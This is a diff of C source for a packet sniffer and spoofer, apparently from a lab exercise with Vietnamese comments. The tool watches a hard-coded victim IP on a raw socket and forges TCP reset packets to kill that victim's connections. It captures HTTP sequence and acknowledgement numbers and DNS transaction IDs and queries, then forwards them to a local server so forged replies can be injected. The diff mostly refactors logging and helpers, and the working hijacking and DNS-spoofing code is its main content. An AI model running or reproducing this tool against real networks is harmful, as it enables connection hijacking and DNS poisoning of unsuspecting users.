@@ -1,3 +1,4 @@
+
 #include <stdio.h>
 #include <string.h>
 #include <stdlib.h>
@@ -16,56 +17,14 @@
 #include <time.h>
 #include <netinet/udp.h>
 #include <netpacket/packet.h>
+#include <stddef.h>  // for size_t
 
-#define MAX_ETHER 1518
-#define INTERFACE "eth0"
-#define LOCAL_SERVER_HOST "172.20.0.104"
-#define LOCAL_SERVER_PORT 9090
-#define VICTIM_IP "172.20.0.102"
-#define SIZE_ETHERNET 14
-
-// Thêm define cho DNS
-#define DNS_PORT 53
-
-// Save TCP connection state for more accurate spoofing
-struct tcp_conn_state {
-    uint32_t seq;
-    uint32_t ack;
-    uint16_t sport;
-    uint16_t dport;
-    uint16_t window;
-    uint8_t flags;
-};
-
-struct dns_header {
-    uint16_t id;
-    uint16_t flags;
-    uint16_t qdcount;
-    uint16_t ancount;
-    uint16_t nscount;
-    uint16_t arcount;
-};
-
-// Use a single DNS structure instead of two different ones
-struct dns_info {
-    uint16_t txid;      // Transaction ID
-    uint16_t flags;     // Flags field
-    uint16_t qdcount;   // Number of questions
-    uint16_t ancount;   // Number of answers
-    uint16_t nscount;   // Number of authority records
-    uint16_t arcount;   // Number of additional records
-    char query[256];    // Query name buffer
-    uint16_t src_port;  // Source port for response
-};
-
-// Checksum calculation
-uint16_t chksum(unsigned char *buf, size_t buflen) {
-    uint32_t sum = 0, i;
-    for(i=0; i<buflen-1; i+=2) sum += *(uint16_t*)&buf[i];
-    if(buflen & 1) sum += buf[buflen - 1];
-    return ~((sum >> 16) + (sum & 0xffff));
-}
-
+// Constants
+#include "common.h"
+#include "utils.h"
+/**
+    * @brief  Send a message to the local server for processing
+*/
 void send_to_local_server(struct tcp_conn_state *state, const char *data, int data_len) {
     int sockfd;
     struct sockaddr_in servaddr;
@@ -85,14 +44,14 @@ void send_to_local_server(struct tcp_conn_state *state, const char *data, int da
 
     // Set socket timeout
     struct timeval tv;
-    tv.tv_sec = 1;  // 1 second timeout
+    tv.tv_sec = 1;
     tv.tv_usec = 0;
     setsockopt(sockfd, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
 
     // Add connection state info to message
     char message[4096];
     snprintf(message, sizeof(message),
-            "VICTIM_HTTP\n"
+            "%s\n"  // Use MSG_TYPE_HTTP macro
             "SEQ=%u\n"
             "ACK=%u\n" 
             "SPORT=%u\n"
@@ -100,16 +59,17 @@ void send_to_local_server(struct tcp_conn_state *state, const char *data, int da
             "WINDOW=%u\n"
             "FLAGS=0x%02x\n"
             "DATA=%.*s",
+            MSG_TYPE_HTTP,  // Use macro here
             state->seq, state->ack,
             state->sport, state->dport,
             state->window, state->flags,
             data_len, data);
 
-    // Send message
-    printf("\nSending to server: %s\n", message);
+    // Send message and handle response
+    debug_log("Sending to server: %s", message);
     if (sendto(sockfd, message, strlen(message), 0, 
         (struct sockaddr *)&servaddr, sizeof(servaddr)) < 0) {
-        printf("Failed to send: %s\n", strerror(errno));
+        debug_log("Failed to send: %s", strerror(errno));
         close(sockfd);
         return;
     }
@@ -121,51 +81,17 @@ void send_to_local_server(struct tcp_conn_state *state, const char *data, int da
     
     if (n > 0) {
         recv_buffer[n] = '\0';
-        printf("Received ACK: %s\n", recv_buffer);
+        debug_log("Received ACK: %s", recv_buffer);
     } else {
-        printf("No acknowledgment received\n");
+        debug_log("No acknowledgment received");
     }
 
     close(sockfd);
 }
 
-// Add debug logging function
-void debug_log(const char *format, ...) {
-    va_list args;
-    va_start(args, format);
-    time_t now = time(NULL);
-    char timestamp[64];
-    strftime(timestamp, sizeof(timestamp), "%Y-%m-%d %H:%M:%S", localtime(&now));
-    printf("[DEBUG %s] ", timestamp);
-    vprintf(format, args);
-    printf("\n");
-    fflush(stdout);
-    va_end(args);
-}
-
-// Add debug print function for packet contents
-void print_packet_content(unsigned char *buffer, int size) {
-    printf("\n==== Packet Content ====\n");
-    // Print raw bytes in hex and ASCII
-    for(int i = 0; i < size; i++) {
-        if(i % 16 == 0) printf("\n%04X: ", i);
-        printf("%02X ", buffer[i]);
-        if((i + 1) % 16 == 0) {
-            printf("  ");
-            // Print ASCII representation
-            for(int j = i - 15; j <= i; j++) {
-                if(buffer[j] >= 32 && buffer[j] <= 126)
-                    printf("%c", buffer[j]);
-                else
-                    printf(".");
-            }
-        }
-    }
-    printf("\n=====================\n");
-}
-
-// Function to send TCP reset packet
-// This will terminate the original connection with server
+/**
+    * @brief  Send a TCP RST packet to reset a connection
+*/
 void send_tcp_reset(struct iphdr *iph, struct tcphdr *tcph) {
     printf("[INFO] Sending TCP RST packet from %s to %s\n",
            inet_ntoa(*(struct in_addr*)&iph->daddr),
@@ -208,7 +134,7 @@ void send_tcp_reset(struct iphdr *iph, struct tcphdr *tcph) {
 
     // Calculate checksums
     ip->check = 0;
-    ip->check = chksum((unsigned char *)ip, sizeof(struct iphdr));
+    ip->check = calculate_checksum((const unsigned short *)ip, sizeof(struct iphdr));
     
     // Add TCP pseudo header checksum like ICMP example
     struct pseudo_header {
@@ -228,7 +154,8 @@ void send_tcp_reset(struct iphdr *iph, struct tcphdr *tcph) {
     char *pseudogram = malloc(sizeof(psh) + sizeof(struct tcphdr));
     memcpy(pseudogram, &psh, sizeof(psh));
     memcpy(pseudogram + sizeof(psh), tcp, sizeof(struct tcphdr));
-    tcp->th_sum = chksum((unsigned char*)pseudogram, sizeof(psh) + sizeof(struct tcphdr));
+    tcp->th_sum = calculate_checksum((const unsigned short*)pseudogram, 
+                                   sizeof(psh) + sizeof(struct tcphdr));
     free(pseudogram);
 
     printf("[DEBUG] TCP RST packet created with SEQ=%u ACK=%u\n", 
@@ -253,17 +180,17 @@ void send_tcp_reset(struct iphdr *iph, struct tcphdr *tcph) {
     close(sock);
 }
 
-// Update function to accept port number
+/**
+    * @brief  Send a DNS request to the local server for processing
+*/
 void send_dns_to_local_server(struct dns_info *dns, uint16_t sport) {
     int sockfd;
     struct sockaddr_in servaddr;
     char recv_buffer[1024];
 
-    printf("\n[+] Creating connection to local server\n"); 
-    
-    // Create UDP socket
+    // Create and configure socket
     if ((sockfd = socket(AF_INET, SOCK_DGRAM, 0)) < 0) {
-        perror("[-] Socket creation failed");
+        debug_log("Socket creation failed");
         return;
     }
 
@@ -274,29 +201,24 @@ void send_dns_to_local_server(struct dns_info *dns, uint16_t sport) {
     // Format DNS request message
     char message[1024];
     snprintf(message, sizeof(message),
-            "DNS_REQUEST\n"
+            "%s\n"  // Use MSG_TYPE_DNS macro
             "TXID=%u\n"
             "QUERY=%s\n" 
             "SPORT=%u\n",
+            MSG_TYPE_DNS,  // Use macro here
             dns->txid, dns->query, sport);
 
-    printf("[+] Sending DNS info: %s\n", message);
-
-    // Send and wait for ACK
+    // Send and receive response
     if (sendto(sockfd, message, strlen(message), 0,
                (struct sockaddr *)&servaddr, sizeof(servaddr)) < 0) {
-        perror("[-] Failed to send DNS info");
+        debug_log("Failed to send DNS info");
     } else {
-        printf("[+] DNS info sent successfully\n");
-        
-        // Wait for ACK
         socklen_t len = sizeof(servaddr);
         int n = recvfrom(sockfd, recv_buffer, sizeof(recv_buffer)-1, 0,
                      (struct sockaddr *)&servaddr, &len);
-        
         if (n > 0) {
             recv_buffer[n] = '\0';
-            printf("[+] Received ACK: %s\n", recv_buffer);
+            debug_log("Received ACK: %s", recv_buffer);
         }
     }
 
@@ -311,6 +233,9 @@ CHỨC NĂNG:
 4. Không cần gửi RST cho DNS packets
 */
 
+/**
+    * @brief  Process a captured packet
+*/
 void process_packet(unsigned char *packet, int size) {
     struct iphdr *iph = (struct iphdr*)(packet + SIZE_ETHERNET);
     
@@ -397,21 +322,18 @@ int main() {
     // Create raw socket
     sockfd = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
     if(sockfd < 0) {
-        perror("Socket creation failed");
-        exit(1);
+        error("Socket creation failed");
     }
 
     // Get interface index
     strncpy(ifr.ifr_name, INTERFACE, IFNAMSIZ);
     if(ioctl(sockfd, SIOCGIFINDEX, &ifr) < 0) {
-        perror("SIOCGIFINDEX");
-        close(sockfd);
-        exit(1);
+        error("SIOCGIFINDEX failed");
     }
 
-    printf("[+] Sniffer started on %s\n", INTERFACE); 
-    printf("[+] Watching victim IP: %s\n", VICTIM_IP);
-    printf("[+] Forwarding to: %s:%d\n", LOCAL_SERVER_HOST, LOCAL_SERVER_PORT);
+    debug_log("Sniffer started on %s", INTERFACE);
+    debug_log("Watching victim IP: %s", VICTIM_IP); 
+    debug_log("Forwarding to: %s:%d", LOCAL_SERVER_HOST, LOCAL_SERVER_PORT);
 
     while(1) {
         int packet_size = recvfrom(sockfd, buffer, MAX_ETHER, 0, NULL, NULL);
